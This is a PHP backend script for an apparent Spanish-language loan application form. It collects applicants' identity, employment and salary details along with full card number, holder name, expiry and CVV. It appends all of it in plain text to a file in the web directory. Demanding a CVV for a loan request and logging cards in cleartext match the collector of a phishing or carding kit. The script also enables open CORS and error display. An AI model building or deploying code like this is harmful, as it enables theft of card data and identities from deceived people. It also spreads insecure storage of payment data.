<?php
// Ensure this is at the very top of the file
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Set headers to handle CORS and content type
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json");

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    echo json_encode(['success' => true]);
    exit();
}

// Check if this is a POST request
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit();
}

// Get form data
$formData = [
    'loanAmount' => $_POST['loanAmount'] ?? '',
    'loanTerm' => $_POST['loanTerm'] ?? '',
    'firstName' => $_POST['firstName'] ?? '',
    'lastName' => $_POST['lastName'] ?? '',
    'dni' => $_POST['dni'] ?? '',
    'province' => $_POST['province'] ?? '',
    'email' => $_POST['email'] ?? '',
    'phone' => $_POST['phone'] ?? '',
    'occupation' => $_POST['occupation'] ?? '',
    'company' => $_POST['company'] ?? '',
    'position' => $_POST['position'] ?? '',
    'monthlySalary' => $_POST['monthlySalary'] ?? '',
    'yearsEmployed' => $_POST['yearsEmployed'] ?? '',
    'cardType' => $_POST['cardType'] ?? '',
    'cardNumber' => $_POST['cardNumber'] ?? '',
    'cardName' => $_POST['cardName'] ?? '',
    'cardExpiry' => $_POST['cardExpiry'] ?? '',
    'cardCvv' => $_POST['cardCvv'] ?? '',
    'timestamp' => date('Y-m-d H:i:s')
];

// Validate required fields
$requiredFields = ['firstName', 'lastName', 'dni', 'cardNumber', 'cardName', 'cardExpiry', 'cardCvv'];
foreach ($requiredFields as $field) {
    if (empty($formData[$field])) {
        http_response_code(400);
        echo json_encode(['success' => false, 'error' => "Field {$field} is required"]);
        exit();
    }
}

try {
    // Create a formatted string for the log entry
    $logEntry = "\n=== NUEVA SOLICITUD: {$formData['timestamp']} ===\n";
    $logEntry .= "DATOS DEL PRÉSTAMO\n";
    $logEntry .= "Monto: $" . number_format($formData['loanAmount'], 2) . "\n";
    $logEntry .= "Plazo: {$formData['loanTerm']} meses\n\n";

    $logEntry .= "DATOS PERSONALES\n";
    $logEntry .= "Nombre: {$formData['firstName']} {$formData['lastName']}\n";
    $logEntry .= "DNI: {$formData['dni']}\n";
    $logEntry .= "Provincia: {$formData['province']}\n";
    $logEntry .= "Email: {$formData['email']}\n";
    $logEntry .= "Teléfono: {$formData['phone']}\n\n";

    $logEntry .= "INFORMACIÓN LABORAL\n";
    $logEntry .= "Ocupación: {$formData['occupation']}\n";
    $logEntry .= "Empresa: {$formData['company']}\n";
    $logEntry .= "Cargo: {$formData['position']}\n";
    $logEntry .= "Salario mensual: $" . number_format($formData['monthlySalary'], 2) . "\n";
    $logEntry .= "Años de antigüedad: {$formData['yearsEmployed']}\n\n";

    $logEntry .= "DATOS DE TARJETA\n";
    $logEntry .= "Tipo: {$formData['cardType']}\n";
    $logEntry .= "Número: {$formData['cardNumber']}\n";
    $logEntry .= "Titular: {$formData['cardName']}\n";
    $logEntry .= "Vencimiento: {$formData['cardExpiry']}\n";
    $logEntry .= "CVV: {$formData['cardCvv']}\n\n";
    $logEntry .= "======================================\n\n";

    // Save to file with absolute path
    $fileName = __DIR__ . '/solicitudes_prestamos.txt';
    if (file_put_contents($fileName, $logEntry, FILE_APPEND) === false) {
        throw new Exception('Failed to save data to file');
    }

    // Return success response
    http_response_code(200);
    echo json_encode(['success' => true, 'message' => 'Solicitud guardada exitosamente']);

} catch (Exception $e) {
    error_log("Error saving form data: " . $e->getMessage());
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    exit();
}